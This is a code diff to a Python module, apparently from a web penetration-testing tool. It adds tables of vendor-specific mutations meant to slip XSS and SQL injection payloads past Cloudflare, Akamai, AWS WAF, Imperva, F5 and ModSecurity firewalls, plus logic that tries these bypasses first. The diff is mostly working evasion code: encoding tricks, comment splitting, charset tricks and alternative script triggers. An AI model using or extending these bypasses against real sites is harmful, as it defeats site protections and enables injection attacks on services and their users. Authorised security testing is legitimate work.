@@ -247,23 +247,82 @@ _MUTATIONS = [
 ]
 
 
+# ── WAF-vendor-specific mutation strategies ──────────────────────────────
+# Known bypass patterns per WAF vendor, curated from real-world research.
+# These are tried first when the WAF vendor is known.
+
+_VENDOR_MUTATIONS: Dict[str, List[tuple]] = {
+    "cloudflare": [
+        ("cf_proto_smuggle", lambda p: p.replace("<script", "<script/x")),
+        ("cf_svg_onload", lambda p: p.replace("<script>alert(1)</script>", '<svg onload="alert(1)">')),
+        ("cf_double_encode", lambda p: p.replace("<", "%253C").replace(">", "%253E")),
+        ("cf_javascript_uri", lambda p: f'<a href="javas\tcript:{p}">x</a>' if "alert" in p else p),
+        ("cf_template_literal", lambda p: p.replace("alert(1)", "alert`1`")),
+        ("cf_constructor", lambda p: p.replace("alert(1)", "[].constructor.constructor('alert(1)')()")),
+    ],
+    "akamai": [
+        ("ak_comment_break", lambda p: p.replace("script", "scr/**/ipt")),
+        ("ak_tab_bypass", lambda p: p.replace("<script>", "<script\t>")),
+        ("ak_null_mid", lambda p: p[:len(p)//2] + "\x00" + p[len(p)//2:]),
+        ("ak_concat_bypass", lambda p: p.replace("'", "' '") if "'" in p else p),
+        ("ak_hex_encode", lambda p: "".join(f"\\x{ord(c):02x}" if not c.isalnum() else c for c in p)),
+    ],
+    "aws_waf": [
+        ("aws_case_mix", lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")),
+        ("aws_comment_inline", lambda p: p.replace(" ", "/*!")),
+        ("aws_version_comment", lambda p: p.replace("UNION", "/*!50000UNION*/")),
+        ("aws_chunk_encoding", lambda p: p.replace("script", "scr\r\nipt")),
+    ],
+    "imperva": [
+        ("imp_hpc", lambda p: p.replace("/", "//")),
+        ("imp_param_frag", lambda p: p.replace("=", "=%00")),
+        ("imp_unicode_norm", lambda p: p.replace("a", "\u0430") if "alert" in p else p),  # Cyrillic а
+        ("imp_multiline", lambda p: p.replace(" ", "\n")),
+    ],
+    "f5_bigip": [
+        ("f5_url_full_encode", lambda p: "".join(f"%{ord(c):02x}" for c in p)),
+        ("f5_overlong_utf8", lambda p: p.replace("<", "\xc0\xbc").replace(">", "\xc0\xbe")),
+    ],
+    "modsecurity": [
+        ("mod_comment_nest", lambda p: p.replace("--", "-- -")),
+        ("mod_charset_trick", lambda p: p.replace("'", "\xbf\x27")),  # GBK trick
+        ("mod_payload_split", lambda p: p.replace("UNION SELECT", "UNION%0aSELECT")),
+    ],
+}
+
+
 def mutate_payload(payload: str,
                    max_variants: int = 20,
-                   strategies: Optional[List[str]] = None) -> List[dict]:
+                   strategies: Optional[List[str]] = None,
+                   waf_vendor: Optional[str] = None) -> List[dict]:
     """Generate mutated variants of a payload.
 
     Args:
         payload: Original payload string that was blocked.
         max_variants: Maximum number of variants to generate.
         strategies: Optional list of strategy names to use (default: all).
+        waf_vendor: Optional WAF vendor name (e.g. "cloudflare", "akamai") for
+                    vendor-specific bypass mutations tried first.
 
     Returns:
         List of dicts: [{"payload": str, "strategy": str, "original": str}, ...]
     """
-    mutations = _MUTATIONS
+    # Build mutation list: vendor-specific first (if known), then generic
+    mutations = list(_MUTATIONS)
+    if waf_vendor:
+        vendor_key = waf_vendor.lower().replace(" ", "_").split("(")[0].strip("_")
+        vendor_muts = _VENDOR_MUTATIONS.get(vendor_key, [])
+        if not vendor_muts:
+            for vk, vm in _VENDOR_MUTATIONS.items():
+                if vk in vendor_key or vendor_key in vk:
+                    vendor_muts = vm
+                    break
+        if vendor_muts:
+            mutations = vendor_muts + mutations
+
     if strategies:
         strategy_set = set(strategies)
-        mutations = [(name, fn) for name, fn in _MUTATIONS if name in strategy_set]
+        mutations = [(name, fn) for name, fn in mutations if name in strategy_set]
 
     variants = []
     seen = {payload}  # Deduplicate
